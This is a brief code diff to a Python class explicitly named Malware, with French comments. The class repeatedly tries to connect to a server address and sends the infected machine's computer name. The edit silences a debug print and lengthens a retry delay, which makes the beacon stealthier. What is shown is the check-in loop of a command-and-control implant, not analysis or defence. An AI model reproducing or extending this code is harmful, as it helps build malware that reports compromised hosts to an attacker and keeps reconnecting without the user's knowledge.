@@ -28,11 +28,11 @@ class Malware:
     """Tentative de connection vers le serveur en boucle"""
     def start(self):
         try:
-            print("try to co ....")
+            #print("try to co ....")
             self.my_socket.connect(SERVER_ADDR)
             self.send(os.environ["COMPUTERNAME"])
         except ConnectionRefusedError:
-            time.sleep(2)
+            time.sleep(4)
             self.start()
         except TimeoutError:
             time.sleep(4)
